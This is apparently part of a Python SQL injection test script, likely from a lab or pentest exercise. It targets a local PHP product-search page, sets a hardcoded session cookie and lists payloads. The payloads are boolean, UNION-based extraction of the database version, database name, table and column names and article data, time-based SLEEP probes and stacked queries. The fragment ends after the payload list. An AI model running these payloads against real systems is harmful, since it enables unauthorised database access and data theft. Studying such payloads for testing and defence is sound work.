import requests
import re

# Configuration
target_url = "http://127.0.0.1:8081/sku_search.php"
session_cookie = "PHPSESSID=05049af6efd6ed216b8a2e6938639807"
cookies = {"PHPSESSID": "05049af6efd6ed216b8a2e6938639807"}

# SQL Injection payloads to test
# Starting with basic techniques and escalating to more sophisticated ones
sqli_payloads = [
    # Boolean-based blind SQLi
    {"payload": "Test' OR '1'='1'-- ", "type": "boolean_or"},
    {"payload": "Test' AND '1'='1'-- ", "type": "boolean_and_true"},
    {"payload": "Test' AND '1'='2'-- ", "type": "boolean_and_false"},
    
    # Union-based SQLi - extract version
    {"payload": "Test' UNION SELECT @@version,@@version,@@version-- ", "type": "union_version"},
    
    # Union-based SQLi - extract database name
    {"payload": "Test' UNION SELECT database(),database(),database()-- ", "type": "union_database"},
    
    # Union-based SQLi - extract table names from information_schema
    {"payload": "Test' UNION SELECT table_name,table_name,table_name FROM information_schema.tables WHERE table_schema=database()-- ", "type": "union_tables"},
    
    # Union-based SQLi - extract column names
    {"payload": "Test' UNION SELECT column_name,column_name,column_name FROM information_schema.columns WHERE table_name='articles'-- ", "type": "union_columns"},
    
    # Extract all data from articles table
    {"payload": "Test' UNION SELECT sku,name,description FROM articles-- ", "type": "union_data"},
    
    # Time-based blind SQLi
    {"payload": "Test' AND SLEEP(5)-- ", "type": "time_sleep"},
    {"payload": "Test' OR IF(1=1,SLEEP(5),0)-- ", "type": "time_if"},
    
    # Error-based SQLi
    {"payload": "Test' AND (SELECT 1 FROM (SELECT SLEEP(5))A)-- ", "type": "error_based"},
    
    # Stacked queries
    {"payload": "Test'; SELECT * FROM articles;-- ", "type": "stacked"},
]

